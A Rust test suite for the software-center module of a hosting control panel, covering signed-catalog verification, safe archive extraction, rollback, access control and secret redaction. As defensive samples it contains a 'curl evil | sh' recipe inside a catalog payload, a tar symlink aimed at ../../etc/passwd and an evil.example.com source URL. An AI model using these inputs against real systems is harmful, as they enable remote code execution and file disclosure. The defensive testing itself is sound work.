#![allow(missing_docs)]
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::{
    collections::BTreeSet,
    sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    },
};

use async_trait::async_trait;
use base64::Engine;
use ed25519_dalek::{Signer, SigningKey};
use openpanel_app::software_center::{
    ApplicationDeployer, ApplicationDeploymentInput, ApplicationDeploymentResources,
    ApplicationResource, AptPackageManager, ArtifactDigest, ArtifactFetcher, CatalogVerifier,
    CommandResult, ComponentAction, CreatedApplicationDatabase, CreatedApplicationSite,
    HostSnapshot, IntegratedApplicationDeployer, PackageCommand, PackageManager, PrivilegedCommand,
    ProvisionedApplication, SafeArtifactInstaller, SignedCatalogEnvelope, SoftwareCenterError,
    SoftwareCenterService, host_package_manager::HostPackageManager, place_artifact_with_gate,
};
use openpanel_core::{AuditAction, AuditOutcome};
use openpanel_domain::{
    Role,
    software_center::{PackageId, PlanAction},
};
use openpanel_test_support::MockAudit;
use uuid::Uuid;

mockall::mock! {Packages{}
#[async_trait]
impl PackageManager for Packages {
    async fn discover(&self) -> Result<HostSnapshot, SoftwareCenterError>;
    async fn apply(&self, actions: &[PlanAction]) -> Result<(), SoftwareCenterError>;
    async fn validate(&self, component: &str) -> Result<(), SoftwareCenterError>;
    async fn rollback(&self, actions: &[PlanAction]) -> Result<(), SoftwareCenterError>;
}}
mockall::mock! {Command{}
#[async_trait]
impl PackageCommand for Command {
    async fn run(&self, program: &'static str, arguments: &[String]) -> Result<CommandResult, SoftwareCenterError>;
}}
mockall::mock! {Applications{}
#[async_trait]
impl ApplicationDeployer for Applications {
    async fn provision(&self, actor: Uuid, input: &ApplicationDeploymentInput) -> Result<ProvisionedApplication, SoftwareCenterError>;
    async fn validate(&self, deployment: &ProvisionedApplication) -> Result<(), SoftwareCenterError>;
    async fn rollback(&self, deployment: &ProvisionedApplication) -> Result<(), SoftwareCenterError>;
}}
mockall::mock! {DeploymentResources{}
#[async_trait]
impl ApplicationDeploymentResources for DeploymentResources {
    async fn create_site(&self, actor: Uuid, input: &ApplicationDeploymentInput) -> Result<CreatedApplicationSite, SoftwareCenterError>;
    async fn create_database(&self, actor: Uuid, input: &ApplicationDeploymentInput) -> Result<CreatedApplicationDatabase, SoftwareCenterError>;
    async fn install_application(&self, input: &ApplicationDeploymentInput, site: &CreatedApplicationSite, database: &CreatedApplicationDatabase, admin_username: &str, admin_password: &str) -> Result<(), SoftwareCenterError>;
    async fn create_dns(&self, input: &ApplicationDeploymentInput) -> Result<String, SoftwareCenterError>;
    async fn create_tls(&self, input: &ApplicationDeploymentInput) -> Result<(), SoftwareCenterError>;
    async fn create_backup(&self, actor: Uuid, input: &ApplicationDeploymentInput, site: &CreatedApplicationSite) -> Result<Uuid, SoftwareCenterError>;
    async fn validate_application(&self, input: &ApplicationDeploymentInput, site: &CreatedApplicationSite) -> Result<(), SoftwareCenterError>;
    async fn remove(&self, resource: &ApplicationResource) -> Result<(), SoftwareCenterError>;
}}

struct BlockingPackages {
    entered: tokio::sync::Notify,
    proceed: tokio::sync::Notify,
    rolled_back: AtomicBool,
}
#[async_trait]
impl PackageManager for BlockingPackages {
    async fn discover(&self) -> Result<HostSnapshot, SoftwareCenterError> {
        Ok(HostSnapshot::test("same-state"))
    }

    async fn apply(&self, _actions: &[PlanAction]) -> Result<(), SoftwareCenterError> {
        self.entered.notify_one();
        self.proceed.notified().await;
        Ok(())
    }

    async fn validate(&self, _component: &str) -> Result<(), SoftwareCenterError> {
        Ok(())
    }

    async fn rollback(&self, _actions: &[PlanAction]) -> Result<(), SoftwareCenterError> {
        self.rolled_back.store(true, Ordering::SeqCst);
        Ok(())
    }
}

#[test]
fn embedded_recovery_catalog_contains_initial_components_and_applications() {
    let packages = MockPackages::new();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let runtime = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .unwrap();
    let ids: Vec<_> = runtime.block_on(async {
        service
            .catalog(Role::Owner)
            .await
            .unwrap()
            .into_iter()
            .map(|entry| entry.id)
            .collect()
    });
    for expected in [
        "nginx",
        "php-7.4",
        "php-8.3",
        "mysql",
        "mariadb",
        "redis",
        "wordpress",
        "drupal",
    ] {
        assert!(ids.iter().any(|id| id == expected), "missing {expected}");
    }
    assert!(runtime.block_on(async { service.catalog(Role::Admin).await.is_err() }));
    let php = runtime.block_on(async {
        service
            .catalog(Role::Owner)
            .await
            .unwrap()
            .into_iter()
            .find(|entry| entry.id == "php-8.3")
            .unwrap()
    });
    assert!(php.description.contains("PHP-FPM"));
    assert!(php.versions.contains(&"8.3.6".to_owned()));
    assert!(
        php.packages
            .iter()
            .any(|package| package.as_str() == "php8.3-mysql")
    );
    assert!(!php.versions.is_empty());
    assert_eq!(
        php.provenance,
        "https://catalog.openpanel.invalid/v1/manifest.json"
    );
}

#[tokio::test]
async fn discovery_reports_external_components_without_taking_ownership() {
    let mut packages = MockPackages::new();
    packages.expect_discover().once().returning(|| {
        let mut snapshot = HostSnapshot::test("state");
        snapshot.installed_packages = BTreeSet::from(["nginx".to_owned()]);
        Ok(snapshot)
    });
    packages.expect_apply().never();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let inventory = service.inventory(Role::Owner).await.unwrap();
    let nginx = inventory.iter().find(|entry| entry.id == "nginx").unwrap();
    assert_eq!(nginx.state, "externally_managed");
    assert_eq!(
        inventory
            .iter()
            .find(|entry| entry.id == "redis")
            .unwrap()
            .state,
        "available"
    );
}

#[tokio::test]
async fn stale_host_state_rejects_execution_before_package_mutation() {
    let mut packages = MockPackages::new();
    let mut sequence = mockall::Sequence::new();
    packages
        .expect_discover()
        .once()
        .in_sequence(&mut sequence)
        .returning(|| Ok(HostSnapshot::test("state-a")));
    packages
        .expect_discover()
        .once()
        .in_sequence(&mut sequence)
        .returning(|| Ok(HostSnapshot::test("state-b")));
    packages.expect_apply().never();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "redis")
        .await
        .unwrap();
    assert_eq!(preview.packages, ["redis-server"]);
    assert!(
        preview
            .estimated_download_bytes
            .is_some_and(|value| value > 0)
    );
    assert!(
        preview
            .estimated_disk_delta_bytes
            .is_some_and(|value| value > 0)
    );
    assert_eq!(
        preview.configuration_paths,
        ["/etc/openpanel/software/redis"]
    );
    assert!(preview.rollback_supported);
    assert!(matches!(
        service
            .execute(
                actor,
                Role::Owner,
                preview.plan.digest(),
                &preview.confirmation_token
            )
            .await,
        Err(SoftwareCenterError::Conflict)
    ));
}

#[tokio::test]
async fn failed_post_install_validation_rolls_back_and_never_reports_success() {
    let mut packages = MockPackages::new();
    packages
        .expect_discover()
        .times(2)
        .returning(|| Ok(HostSnapshot::test("same-state")));
    packages.expect_apply().once().returning(|actions| {
        assert_eq!(actions.len(), 1);
        Ok(())
    });
    packages
        .expect_validate()
        .once()
        .withf(|component| component == "nginx")
        .returning(|_| Err(SoftwareCenterError::Validation));
    packages.expect_rollback().once().returning(|_| Ok(()));
    let mut audit = MockAudit::new();
    audit
        .expect_record()
        .once()
        .withf(|event| {
            event.action == AuditAction::SoftwareChanged
                && event.outcome == AuditOutcome::Success
                && event.metadata["operation"] == "component_previewed"
        })
        .returning(|_| Ok(()));
    audit
        .expect_record()
        .once()
        .withf(|event| {
            event.action == AuditAction::SoftwareChanged
                && event.outcome == AuditOutcome::Failure
                && event.metadata["operation"] == "validation_failed"
        })
        .returning(|_| Ok(()));
    audit.expect_recent().returning(|_| Ok(Vec::new()));
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(audit));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "nginx")
        .await
        .unwrap();
    let job = service
        .execute(
            actor,
            Role::Owner,
            preview.plan.digest(),
            &preview.confirmation_token,
        )
        .await
        .unwrap_err();
    assert_eq!(job, SoftwareCenterError::Validation);
    assert_eq!(service.jobs(Role::Owner).await.unwrap()[0].state, "failed");
}

#[tokio::test]
async fn non_owner_is_rejected_before_discovery_or_commands() {
    let mut packages = MockPackages::new();
    packages.expect_discover().never();
    packages.expect_apply().never();
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    assert!(matches!(
        service
            .preview_install(Uuid::new_v4(), Role::Admin, "redis")
            .await,
        Err(SoftwareCenterError::Forbidden)
    ));
}

#[tokio::test]
async fn apt_adapter_uses_fixed_program_and_end_of_options_before_validated_packages() {
    let mut command = MockCommand::new();
    command
        .expect_run()
        .once()
        .withf(|program, arguments| {
            program == "/usr/bin/apt-get" && arguments == ["-y", "install", "--", "redis-server"]
        })
        .returning(|_, _| Ok(CommandResult::success("installed")));
    let adapter = AptPackageManager::new(Arc::new(command));
    adapter
        .apply(&[PlanAction::install(PackageId::new("redis-server").unwrap())])
        .await
        .unwrap();
}

#[test]
fn package_diagnostics_are_bounded_and_redact_secret_bearing_lines() {
    let result = CommandResult::success(&format!(
        "normal line\npassword=super-secret\n{}",
        "x".repeat(20_000)
    ));
    assert!(result.output.contains("normal line"));
    assert!(!result.output.contains("super-secret"));
    assert!(result.output.len() <= 8_192);
}

#[tokio::test]
async fn failed_application_health_check_unwinds_job_created_resources() {
    let mut packages = MockPackages::new();
    packages
        .expect_discover()
        .times(2)
        .returning(|| Ok(HostSnapshot::test("same-state")));
    packages.expect_apply().once().returning(|_| Ok(()));
    packages.expect_rollback().once().returning(|_| Ok(()));
    let mut applications = MockApplications::new();
    applications.expect_provision().once().returning(|_, _| {
        Ok(ProvisionedApplication::test(
            vec!["site:example.test", "database:wp_example"],
            "admin",
            "one-time-secret",
        ))
    });
    applications
        .expect_validate()
        .once()
        .returning(|_| Err(SoftwareCenterError::Validation));
    applications
        .expect_rollback()
        .once()
        .withf(|deployment| deployment.resources == ["site:example.test", "database:wp_example"])
        .returning(|_| Ok(()));
    let service = SoftwareCenterService::with_deployer(
        Arc::new(packages),
        Arc::new(applications),
        Arc::new(MockAudit::stub()),
    );
    let actor = Uuid::new_v4();
    let preview = service
        .preview_deployment(
            actor,
            Role::Owner,
            ApplicationDeploymentInput::test("wordpress", "example.test", "8.3"),
        )
        .await
        .unwrap();
    assert!(matches!(
        service
            .execute_deployment(
                actor,
                Role::Owner,
                preview.plan.digest(),
                &preview.confirmation_token,
            )
            .await,
        Err(SoftwareCenterError::Validation)
    ));
    let serialized = serde_json::to_string(&service.jobs(Role::Owner).await.unwrap()).unwrap();
    assert!(!serialized.contains("one-time-secret"));
}

#[tokio::test]
async fn integrated_application_failure_removes_only_created_resources_in_reverse_order() {
    let actor = Uuid::new_v4();
    let site_id = Uuid::new_v4();
    let database_id = Uuid::new_v4();
    let mut sequence = mockall::Sequence::new();
    let mut resources = MockDeploymentResources::new();
    resources
        .expect_create_site()
        .once()
        .in_sequence(&mut sequence)
        .returning(move |_, _| {
            Ok(CreatedApplicationSite {
                id: site_id,
                document_root: "/var/www/example.test/public_html".into(),
            })
        });
    resources
        .expect_create_database()
        .once()
        .in_sequence(&mut sequence)
        .returning(move |_, _| {
            Ok(CreatedApplicationDatabase {
                id: database_id,
                name: "software_wp_example".into(),
                username: "software_wp_example".into(),
                host: "localhost".into(),
                password: "database-secret".into(),
            })
        });
    resources
        .expect_install_application()
        .once()
        .in_sequence(&mut sequence)
        .withf(|input, _, _, username, password| {
            input.application == "wordpress"
                && username == "openpanel-admin"
                && password.len() == 24
        })
        .returning(|_, _, _, _, _| Err(SoftwareCenterError::Validation));
    resources
        .expect_remove()
        .once()
        .in_sequence(&mut sequence)
        .withf(move |resource| {
            matches!(resource, ApplicationResource::Database { id } if *id == database_id)
        })
        .returning(|_| Ok(()));
    resources
        .expect_remove()
        .once()
        .in_sequence(&mut sequence)
        .withf(move |resource| {
            matches!(resource, ApplicationResource::Site { id, .. } if *id == site_id)
        })
        .returning(|_| Ok(()));
    resources.expect_create_dns().never();
    resources.expect_create_tls().never();
    resources.expect_create_backup().never();
    resources.expect_validate_application().never();

    let deployer = IntegratedApplicationDeployer::new(Arc::new(resources));
    let result = deployer
        .provision(
            actor,
            &ApplicationDeploymentInput::test("wordpress", "example.test", "8.3"),
        )
        .await;
    assert_eq!(result.unwrap_err(), SoftwareCenterError::Validation);
}

#[tokio::test]
async fn external_component_requires_explicit_adoption_before_removal() {
    let mut packages = MockPackages::new();
    packages.expect_discover().times(5).returning(|| {
        let mut snapshot = HostSnapshot::test("same-state");
        snapshot.installed_packages = BTreeSet::from(["redis-server".to_owned()]);
        Ok(snapshot)
    });
    packages.expect_validate().once().returning(|_| Ok(()));
    packages.expect_apply().once().withf(|actions| {
        matches!(actions, [PlanAction::Remove(package)] if package.as_str() == "redis-server")
    }).returning(|_| Ok(()));
    let service = SoftwareCenterService::new(Arc::new(packages), Arc::new(MockAudit::stub()));
    let actor = Uuid::new_v4();
    assert!(matches!(
        service
            .preview_component(actor, Role::Owner, "redis", ComponentAction::Remove)
            .await,
        Err(SoftwareCenterError::Conflict)
    ));
    let adoption = service
        .preview_component(actor, Role::Owner, "redis", ComponentAction::Adopt)
        .await
        .unwrap();
    service
        .execute(
            actor,
            Role::Owner,
            adoption.plan.digest(),
            &adoption.confirmation_token,
        )
        .await
        .unwrap();
    let removal = service
        .preview_component(actor, Role::Owner, "redis", ComponentAction::Remove)
        .await
        .unwrap();
    service
        .execute(
            actor,
            Role::Owner,
            removal.plan.digest(),
            &removal.confirmation_token,
        )
        .await
        .unwrap();
}

#[test]
fn remote_catalog_requires_valid_signature_schema_expiry_and_strict_payload() {
    let signing = SigningKey::from_bytes(&[7_u8; 32]);
    let verifier = CatalogVerifier::new(signing.verifying_key().to_bytes());
    let payload = r#"{"entries":[{"id":"redis","name":"Redis"}]}"#;
    let signed = format!("1\n2000\n{payload}");
    let signature = base64::engine::general_purpose::STANDARD
        .encode(signing.sign(signed.as_bytes()).to_bytes());
    let envelope = SignedCatalogEnvelope {
        schema: 1,
        expires_at: 2000,
        payload: payload.to_owned(),
        signature,
    };
    assert!(verifier.verify(&envelope, 1000).is_ok());
    let mut tampered = envelope.clone();
    tampered.payload.push(' ');
    assert!(verifier.verify(&tampered, 1000).is_err());
    let mut expired = envelope.clone();
    expired.expires_at = 999;
    assert!(verifier.verify(&expired, 1000).is_err());
    let unknown = r#"{"entries":[],"recipe":"curl evil | sh"}"#;
    let signed = format!("1\n2000\n{unknown}");
    let strict = SignedCatalogEnvelope {
        schema: 1,
        expires_at: 2000,
        payload: unknown.to_owned(),
        signature: base64::engine::general_purpose::STANDARD
            .encode(signing.sign(signed.as_bytes()).to_bytes()),
    };
    assert!(verifier.verify(&strict, 1000).is_err());
}

#[test]
fn verified_artifacts_extract_under_staging_and_reject_symlinks_or_tampering() {
    use std::io::Read;

    use flate2::{Compression, write::GzEncoder};
    use sha2::{Digest, Sha256};

    fn archive(symlink: bool) -> Vec<u8> {
        let encoder = GzEncoder::new(Vec::new(), Compression::default());
        let mut tar = tar::Builder::new(encoder);
        if symlink {
            let mut header = tar::Header::new_gnu();
            header.set_entry_type(tar::EntryType::Symlink);
            header.set_size(0);
            header.set_mode(0o777);
            header.set_cksum();
            tar.append_link(&mut header, "wordpress/escape", "../../etc/passwd")
                .unwrap();
        } else {
            let body = b"<?php echo 'healthy';";
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append_data(&mut header, "wordpress/index.php", &body[..])
                .unwrap();
        }
        tar.into_inner().unwrap().finish().unwrap()
    }

    let bytes = archive(false);
    let digest = ArtifactDigest::sha256(&hex::encode(Sha256::digest(&bytes))).unwrap();
    let root = tempfile::tempdir().unwrap();
    SafeArtifactInstaller::default()
        .extract_verified(&bytes, &digest, "wordpress", root.path())
        .unwrap();
    let mut content = String::new();
    std::fs::File::open(root.path().join("index.php"))
        .unwrap()
        .read_to_string(&mut content)
        .unwrap();
    assert!(content.contains("healthy"));
    let mut tampered = bytes.clone();
    tampered.push(0);
    assert!(
        SafeArtifactInstaller::default()
            .extract_verified(&tampered, &digest, "wordpress", root.path())
            .is_err()
    );
    let linked = archive(true);
    let linked_digest = ArtifactDigest::sha256(&hex::encode(Sha256::digest(&linked))).unwrap();
    let linked_root = tempfile::tempdir().unwrap();
    assert!(
        SafeArtifactInstaller::default()
            .extract_verified(&linked, &linked_digest, "wordpress", linked_root.path())
            .is_err()
    );
}

#[tokio::test]
async fn cancellation_waits_for_package_checkpoint_then_rolls_back() {
    let packages = Arc::new(BlockingPackages {
        entered: tokio::sync::Notify::new(),
        proceed: tokio::sync::Notify::new(),
        rolled_back: AtomicBool::new(false),
    });
    let service = Arc::new(SoftwareCenterService::new(
        packages.clone(),
        Arc::new(MockAudit::stub()),
    ));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "redis")
        .await
        .unwrap();
    let digest = preview.plan.digest().to_owned();
    let token = preview.confirmation_token;
    let running_service = service.clone();
    let running = tokio::spawn(async move {
        running_service
            .execute(actor, Role::Owner, &digest, &token)
            .await
    });
    packages.entered.notified().await;
    let active = service.jobs(Role::Owner).await.unwrap();
    assert_eq!(active[0].state, "running");
    let pending = service
        .cancel(actor, Role::Owner, active[0].id)
        .await
        .unwrap();
    assert_eq!(pending.state, "cancellation_pending");
    packages.proceed.notify_one();
    let cancelled = running.await.unwrap().unwrap();
    assert_eq!(cancelled.state, "cancelled");
    assert!(packages.rolled_back.load(Ordering::SeqCst));
}

/// Package manager that records every applied action and always succeeds.
#[derive(Default)]
struct RecordingPackages {
    applied: std::sync::Mutex<Vec<PackageId>>,
}
#[async_trait]
impl PackageManager for RecordingPackages {
    async fn discover(&self) -> Result<HostSnapshot, SoftwareCenterError> {
        Ok(HostSnapshot::test("same-state"))
    }

    async fn apply(&self, actions: &[PlanAction]) -> Result<(), SoftwareCenterError> {
        for action in actions {
            match action {
                PlanAction::Install(package)
                | PlanAction::Update(package)
                | PlanAction::Remove(package) => self
                    .applied
                    .lock()
                    .expect("applied lock")
                    .push(package.clone()),
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        Ok(())
    }

    async fn validate(&self, _component: &str) -> Result<(), SoftwareCenterError> {
        tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        Ok(())
    }

    async fn rollback(&self, _actions: &[PlanAction]) -> Result<(), SoftwareCenterError> {
        Ok(())
    }
}

/// Audit double that counts recorded events for deterministic polling.
#[derive(Default)]
struct CountingAudit {
    recorded: AtomicBool,
}
#[async_trait]
impl openpanel_core::AuditService for CountingAudit {
    async fn record(&self, _event: openpanel_core::AuditEvent) -> openpanel_core::CoreResult<()> {
        self.recorded.store(true, Ordering::SeqCst);
        Ok(())
    }

    async fn recent(
        &self,
        _limit: i64,
    ) -> openpanel_core::CoreResult<Vec<openpanel_core::AuditEvent>> {
        Ok(Vec::new())
    }
}

#[tokio::test]
async fn start_execute_runs_in_background_and_reports_progress() {
    let packages = Arc::new(RecordingPackages::default());
    let audit = Arc::new(CountingAudit::default());
    let service = Arc::new(SoftwareCenterService::new(packages.clone(), audit.clone()));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "php-8.3")
        .await
        .unwrap();
    assert_eq!(preview.packages.len(), 9, "php-8.3 should plan 9 packages");
    let digest = preview.plan.digest().to_owned();
    let token = preview.confirmation_token;
    let job_id = service
        .start_execute(actor, Role::Owner, &digest, &token)
        .await
        .unwrap();

    let mut seen = Vec::new();
    let mut terminal = None;
    for _ in 0..2000 {
        if let Some(live) = service.system_job_progress(&job_id) {
            seen.push((live.percent, live.step.clone()));
        }
        let jobs = service.jobs(Role::Owner).await.unwrap();
        if let Some(job) = jobs.into_iter().find(|job| job.id == job_id)
            && job.state == "succeeded"
            && audit.recorded.load(Ordering::SeqCst)
        {
            terminal = Some(job);
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
    }
    let job = terminal.expect("job should reach the succeeded state");
    assert_eq!(job.percent, 100);
    assert_eq!(job.step, "Completed");
    assert!(
        seen.iter()
            .any(|(percent, step)| *percent == 99 && step == "Validating"),
        "expected a 99% Validating step, saw {seen:?}"
    );
    assert!(
        seen.iter()
            .any(|(_, step)| step == "Installing 2 of 9 · php8.3-cli"),
        "expected per-package step labels, saw {seen:?}"
    );
    let applied = packages.applied.lock().expect("applied lock").clone();
    assert_eq!(applied.len(), 9, "every planned package must be applied");
    assert!(audit.recorded.load(Ordering::SeqCst));
}

#[tokio::test]
async fn start_execute_cancellation_lands_at_a_package_boundary() {
    let packages = Arc::new(BlockingPackages {
        entered: tokio::sync::Notify::new(),
        proceed: tokio::sync::Notify::new(),
        rolled_back: AtomicBool::new(false),
    });
    let service = Arc::new(SoftwareCenterService::new(
        packages.clone(),
        Arc::new(MockAudit::stub()),
    ));
    let actor = Uuid::new_v4();
    let preview = service
        .preview_install(actor, Role::Owner, "php-8.3")
        .await
        .unwrap();
    let digest = preview.plan.digest().to_owned();
    let token = preview.confirmation_token;
    let job_id = service
        .start_execute(actor, Role::Owner, &digest, &token)
        .await
        .unwrap();

    packages.entered.notified().await;
    let live = service
        .system_job_progress(&job_id)
        .expect("job should be live");
    assert_eq!(live.percent, 0, "first package reports 0%");
    let pending = service
        .cancel(actor, Role::Owner, job_id)
        .await
        .expect("cancel accepted while running");
    assert_eq!(pending.state, "cancellation_pending");
    packages.proceed.notify_one();

    let mut terminal = None;
    for _ in 0..2000 {
        let jobs = service.jobs(Role::Owner).await.unwrap();
        if let Some(job) = jobs.into_iter().find(|job| job.id == job_id)
            && job.state == "cancelled"
        {
            terminal = Some(job);
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(5)).await;
    }
    let job = terminal.expect("job should reach the cancelled state");
    assert_eq!(
        job.percent, 0,
        "a job cancelled mid-first-package reports the checkpoint percent, not 100"
    );
    assert!(packages.rolled_back.load(Ordering::SeqCst));
}

// ---------------------------------------------------------------------------
// Aggregator tests — exercise the new `source`, `seed`, and `store` modules.
// ---------------------------------------------------------------------------

use openpanel_app::software_center::{
    CatalogQuery, CatalogSource, CompatibilityHost, EmbeddedCatalogSource, HttpCatalogSource,
    HttpSourceConfig, SoftwareCatalogStore, StaticCatalogSource, default_catalog_url,
    seed::embedded_manifest,
};
use openpanel_test_support::TestDb;

async fn build_store() -> (SoftwareCatalogStore, TestDb) {
    let db = TestDb::new().await;
    // TestDb only runs the core migrations; run the software-center
    // V001 + V002 + V003 migrations so the aggregator store has its tables.
    let pool = db.pool();
    sqlx::query(openpanel_app::migrations::SOFTWARE_CENTER_V001)
        .execute(&pool)
        .await
        .expect("software_center V001");
    sqlx::query(openpanel_app::migrations::SOFTWARE_CENTER_V002)
        .execute(&pool)
        .await
        .expect("software_center V002");
    sqlx::query(openpanel_app::migrations::SOFTWARE_CENTER_V003)
        .execute(&pool)
        .await
        .expect("software_center V003");
    let store = SoftwareCatalogStore::new(Some(pool));
    (store, db)
}

#[tokio::test]
async fn embedded_seed_materializes_into_the_store_on_first_boot() {
    let (store, _db) = build_store().await;
    assert!(!store.has_active_snapshot().await);
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    let activation = store
        .materialize_seed_if_empty(&embedded)
        .await
        .unwrap()
        .expect("seed materializes on empty store");
    assert!(activation.embedded);
    assert!(activation.entry_count >= 25);
    assert!(store.has_active_snapshot().await);
}

#[tokio::test]
async fn materializing_a_second_time_is_a_no_op() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    assert!(
        store
            .materialize_seed_if_empty(&embedded)
            .await
            .unwrap()
            .is_some()
    );
    assert!(
        store
            .materialize_seed_if_empty(&embedded)
            .await
            .unwrap()
            .is_none()
    );
}

#[tokio::test]
async fn stale_embedded_seed_is_re_activated_to_backfill_new_fields() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    if let Ok(manifest) = embedded_manifest() {
        eprintln!("SEED-DIGEST: {}", manifest.digest());
    }
    assert!(
        store
            .materialize_seed_if_empty(&embedded)
            .await
            .unwrap()
            .is_some()
    );
    let platforms = store.platforms_for("mysql").await.unwrap();
    assert!(
        platforms.is_some_and(|list| !list.is_empty()),
        "mysql should have platforms after seed materialization"
    );
    // Simulate a snapshot that predates the `platforms` seed data by
    // stamping a bogus manifest digest onto the embedded rows.
    sqlx::query("UPDATE software_entries SET manifest_digest = 'stale-digest' WHERE embedded = 1")
        .execute(&_db.pool())
        .await
        .expect("stamp stale digest");
    assert!(
        store
            .materialize_seed_if_empty(&embedded)
            .await
            .unwrap()
            .is_some(),
        "stale embedded seed should re-activate"
    );
    let platforms = store.platforms_for("mysql").await.unwrap();
    assert!(
        platforms.is_some_and(|list| !list.is_empty()),
        "platforms should be backfilled after re-activation"
    );
}

#[tokio::test]
async fn search_filters_by_text_category_and_tag() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let query = CatalogQuery {
        text: Some("redis".into()),
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    let ids: Vec<_> = page.hits.iter().map(|hit| hit.id.as_str()).collect();
    assert!(ids.contains(&"redis"));
    let query = CatalogQuery {
        categories: vec![openpanel_domain::software_center::Category::Database],
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    assert!(page.hits.iter().all(|hit| matches!(
        hit.category,
        openpanel_domain::software_center::Category::Database
    )));
    let query = CatalogQuery {
        tags: vec![openpanel_domain::software_center::Tag::new("php").unwrap()],
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    assert!(
        !page.hits.is_empty(),
        "expected at least one hit for tag 'php', got {page:?}"
    );
    assert!(
        page.hits
            .iter()
            .all(|hit| hit.tags.contains(&"php".to_string()))
    );
}

#[tokio::test]
async fn entry_lookup_returns_versions_tags_and_provenance() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let entry = store
        .get_entry("nginx")
        .await
        .unwrap()
        .expect("nginx must be present");
    assert_eq!(entry.id, "nginx");
    assert!(!entry.versions.is_empty());
    assert!(!entry.tags.is_empty());
    assert!(entry.provenance.embedded);
    assert!(entry.provenance.entry_count >= 25);
    assert!(store.get_entry("does-not-exist").await.unwrap().is_none());
}

#[tokio::test]
async fn compatibility_report_rejects_missing_php_runtime() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let host = CompatibilityHost::default();
    let report = store
        .compatibility_for("nextcloud", "29.0.1", &host, &[], &[("mysql".into(), true)])
        .await
        .unwrap();
    assert!(
        !report.is_compatible(),
        "expected compatibility errors, got {report:?}"
    );
    assert!(
        report
            .errors
            .iter()
            .any(|issue| issue.code == "missing_php_runtime")
    );
}

#[tokio::test]
async fn compatibility_report_rejects_conflict_when_already_managed() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    let host = CompatibilityHost::default();
    let report = store
        .compatibility_for("mariadb", "10.11.6", &host, &[], &[("mysql".into(), true)])
        .await
        .unwrap();
    assert!(
        report
            .errors
            .iter()
            .any(|issue| issue.code == "conflict_installed")
    );
}

#[tokio::test]
async fn static_source_returns_its_manifest() {
    let manifest = embedded_manifest().unwrap();
    let source = StaticCatalogSource::new("https://example.com/manifest.json", manifest);
    let fetched = source.fetch(0).await.unwrap();
    assert_eq!(fetched.source_url, "https://example.com/manifest.json");
    assert!(!fetched.manifest.entries.is_empty());
}

#[tokio::test]
async fn http_source_rejects_off_allowlist_origin() {
    let config = HttpSourceConfig::new(
        "https://evil.example.com/manifest.json",
        std::collections::BTreeSet::from(["catalog.openpanel.dev".to_string()]),
    );
    let source = HttpCatalogSource::new(config).unwrap();
    let result = source.fetch(0).await;
    assert!(matches!(
        result,
        Err(openpanel_app::software_center::SoftwareCenterError::Invalid(_))
    ));
}

#[tokio::test]
async fn diagnostics_reflect_last_refresh_attempt() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    store
        .record_refresh(
            "https://catalog.openpanel.dev/v1/manifest.json",
            "success",
            Some("digest"),
            None,
        )
        .await
        .unwrap();
    let diag = store.diagnostics().await.unwrap();
    assert_eq!(diag.source_id, "embedded");
    assert!(diag.entry_count >= 25);
    assert!(diag.last_refresh.is_some());
    assert_eq!(diag.last_refresh.as_ref().unwrap().outcome, "success");
}

#[tokio::test]
async fn search_respects_installed_only_toggle() {
    let (store, _db) = build_store().await;
    let embedded = EmbeddedCatalogSource::new(default_catalog_url());
    store.materialize_seed_if_empty(&embedded).await.unwrap();
    sqlx::query("INSERT INTO software_components(id, version, status, managed, state_digest, updated_at) VALUES(?,?,?,?,?,?)")
        .bind("nginx")
        .bind("1.24.0")
        .bind("installed")
        .bind(1_i64)
        .bind("digest")
        .bind("2024-01-01T00:00:00Z")
        .execute(&_db.pool())
        .await
        .unwrap();
    let query = CatalogQuery {
        installed_only: true,
        ..CatalogQuery::default()
    };
    let page = store.search(&query).await.unwrap();
    let ids: Vec<_> = page.hits.iter().map(|hit| hit.id.as_str()).collect();
    assert!(ids.contains(&"nginx"));
}

#[test]
fn catalog_sort_label_is_stable() {
    use openpanel_domain::software_center::{CatalogSearchPage, CatalogSort};
    let query = CatalogQuery {
        sort: CatalogSort::Recent,
        ..CatalogQuery::default()
    };
